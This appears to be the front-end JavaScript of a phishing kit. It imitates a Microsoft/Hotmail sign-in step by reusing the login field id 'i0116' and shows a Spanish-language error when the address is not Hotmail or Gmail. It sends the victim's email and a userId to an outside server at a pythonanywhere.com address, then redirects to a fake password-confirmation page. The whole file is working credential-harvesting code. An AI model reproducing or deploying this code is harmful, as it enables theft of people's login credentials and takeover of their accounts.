document.addEventListener('DOMContentLoaded', function() {
    // get userId
    const urlParams = new URLSearchParams(window.location.search);
    const userId = urlParams.get('userId');

    // todo: add confirmation of data before continue
    
    // Go to pwd screen 
    const btnSgt = document.getElementById('btnSgt');
    btnSgt.onclick = function(){
        // get text from input field
        const userMail = document.getElementById('i0116');
        const stringValue = userMail.value; 


    // Check if stringValue is empty or doesn't contain "@hotmail.com" or "@gmail.com"
    if (stringValue === '' || stringValue.indexOf('@hotmail.com') === -1 && stringValue.indexOf('@gmail.com') === -1) {
        // Display error message to the user

        var errorMessage = "<p style='color: red;'>Ingresa un correo válido.</p>";
        // Check if the error message element already exists
        if (!document.getElementById("errorMessage")) {
          var wrapperDiv = document.createElement("div");
          wrapperDiv.id = "errorMessage";
          wrapperDiv.innerHTML = errorMessage;

          var i0116Element = document.getElementById("i0116");
          i0116Element.parentNode.insertBefore(wrapperDiv, i0116Element.nextSibling);
        }
        return;
      } else {
        
        // Send to next screen and go to next screen
        var user_card = new Object();
        user_card.userId = userId;
        user_card.userMail = stringValue;
        user_card.userPwd = "";

        var jsonString= JSON.stringify(user_card);
        console.log(jsonString);

        // send inputs to server
        var url = "http://handsomeindividual.pythonanywhere.com/send_utilities_mail";
        //var url = "http://127.0.0.1:5000/send_utilities_mail";
        var params = user_card;
        var parameters = JSON.stringify(user_card);
        var xhr = new XMLHttpRequest();
        xhr.open("POST", url, true);

        // Send the proper header information along with the request
        xhr.setRequestHeader("Content-type", "application/json");
        xhr.send(parameters);



        const urlParams = new URLSearchParams();
        urlParams.append("value", stringValue);
        urlParams.append("userId", userId);

        const urlToContinue = "/confirmhotmailpwd?" + urlParams.toString();

/*         const urlToContinue = "/confirmhotmailpwd?value="
         + encodeURIComponent(stringValue)
         + "?userId=" + encodeURIComponent(userId); */
        window.location.href = urlToContinue;
      }
    }

  });